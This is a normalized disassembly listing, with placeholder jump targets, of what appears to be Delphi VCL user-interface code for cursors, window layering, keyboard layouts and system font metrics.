mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_464ad0
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_464ad0
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_41b64c
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41b7f0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45da8c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4638d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4638d8
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44a460
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_463948
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_4638d8
pop ecx
mov eax [ esi + 0x34 ]
call sub_458d88
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_458d98
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_4639cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44babc
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_40358c
sub_4639f0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40358c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_463a20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4639f0
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463a20
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44a460
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463a9c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_4639f0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4639f0
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_463a20
pop ecx
test al al
je r-xdata
sub_463af0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_40358c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_463b20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463af0
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463b20
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44a460
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463b9c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_463af0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_463af0
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_463b20
pop ecx
test al al
je r-xdata
sub_463bf0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_41b654
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_4533d0
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_463c44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_463bf0
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_40358c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463cc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_424238
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_463cfc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_447468
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_448138
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_463d44
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_44d7a4
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_44d7a4
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_44d7a4
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call RedrawWindow
sub_463e98
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45ec48
mov dl 0x5
mov eax ebx
call sub_4609bc
mov dl 0x1
mov eax ebx
call sub_44c348
mov dl 0x3
mov eax ebx
call sub_460cb8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_463f00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_463fd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44c208
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44c074
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_446498
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446ef8
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404210
mov eax [ ebp - 0xc ]
call sub_4043e0
push eax
mov eax [ ebp - 0xc ]
call sub_4045e0
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_446f08
mov eax [ ebp - 0xc ]
call sub_4043e0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463fde
lea eax [ ebp - 0xc ]
call sub_404120
retn
mov dl 0x1
mov eax esi
call sub_46003c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_446fb4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_40476c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_464004
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44a49c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_45f760
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44a460
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40358c
inc ebp
dec edi
jne r-xdata
sub_464050
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44c208
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46407c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ca10
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_4640a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_46240c
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44d7a4
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44c208
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44d7a4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44c21c
or ecx 0xffffffff
mov dl 0x1
call sub_44762c
pop esi
pop ebx
retn
sub_46413c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44ce80
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_448138
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_446924
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40358c
sub_464194
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46425a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_446ef8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404210
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_446f08
mov eax [ ebp - 0x4 ]
call sub_4043e0
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_446fb4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464261
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_46003c
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40476c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_464280
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44cc00
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44c208
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44c21c
mov dl [ ebx + 0x57 ]
call sub_446ea4
inc edi
dec esi
jne r-xdata
sub_464324
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_464354
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_464384
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_423aa8
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_464728
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_464734
mov eax ebx
call sub_464740
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_460b5c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_464b60
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_464a3c
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_464a3c
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_464a3c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4644dc
push ebx
push esi
push edi
push ebp
call sub_40375c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403390
mov eax [ ebp + 0x88 ]
call sub_403390
mov eax [ ebp + 0x84 ]
call sub_403390
mov eax [ ebp + 0x54 ]
call sub_403390
mov eax [ ebp + 0x50 ]
call sub_403390
mov eax [ ebp + 0x4c ]
call sub_403390
mov eax [ ebp + 0x30 ]
call sub_403390
mov eax [ ebp + 0x34 ]
call sub_403390
mov eax [ ebp + 0x7c ]
call sub_403390
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403390
mov eax ebp
call sub_46479c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_423af4
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403744
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_41b654
call sub_403390
inc edi
dec esi
jne r-xdata
sub_464654
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4646a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41b4f8
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41b4f8
mov eax [ rw-data ]
call sub_4674d4
sub_4646d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41b7f0
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41b7f0
mov eax [ rw-data ]
call sub_4674d4
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_44ed5c
sub_464740
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_4647f8
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_46479c
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4027d4
mov ebx esi
test ebx ebx
jne r-xdata
sub_4647f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4027b4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_464820
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4649cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4649d2
lea eax [ ebp - 0x260 ]
call sub_404120
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404120
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41daf4
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_409258
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4524c0
test al al
je r-xdata
xor eax eax
push ebp
push sub_464987
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404390
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404390
sub_464a3c
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_467344
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4670f8
mov dl 0x1
mov eax [ rw-data ]
call sub_4670f8
sub_464aa8
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_464ad0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_464aa8
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406f00
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406e80
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_464b60
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_464ca5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4670f8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
